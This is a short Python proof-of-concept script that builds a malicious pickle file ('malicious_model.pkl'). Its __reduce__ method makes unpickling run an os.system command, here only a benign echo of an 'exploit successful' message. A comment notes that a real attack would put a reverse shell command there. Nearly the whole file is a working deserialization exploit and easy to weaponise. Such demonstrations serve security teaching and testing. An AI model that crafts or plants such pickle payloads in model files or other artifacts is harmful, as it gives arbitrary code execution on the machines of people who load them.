import pickle
import os

# This class defines the "payload"
class MaliciousModel:
    def __reduce__(self):
        # This tells the pickle loader to call os.system('echo...')
        # In a real attack, this would be a reverse shell command
        return (os.system, ("echo '!!! EXPLOIT SUCCESSFUL: PICKLE DESERIALIZATION EXECUTED !!!'",))

# Serialize the class to a file
with open("malicious_model.pkl", "wb") as f:
    pickle.dump(MaliciousModel(), f)

print("Created malicious_model.pkl successfully.")
